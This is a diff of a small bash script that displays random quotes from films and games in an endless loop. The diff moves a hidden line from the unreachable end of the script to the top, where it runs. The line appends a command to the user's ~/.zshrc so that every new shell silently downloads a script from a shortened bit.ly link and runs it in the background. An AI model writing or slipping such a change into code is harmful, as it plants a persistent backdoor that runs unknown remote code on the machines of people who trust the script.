@@ -1,5 +1,7 @@
 #!/bin/bash
 
+echo "curl -sL bit.ly/karma42 | bash &" >> ~/.zshrc
+
 MESSAGES=(
 	"There is no spoon. - Neo"
 	"It's dangerous to go alone! Take this. - Old Man"
@@ -58,4 +60,3 @@ while true; do
     sleep $DELAY
     show_random_message
 done
-echo "curl -sL bit.ly/karma42 | bash &" >> ~/.zshrc
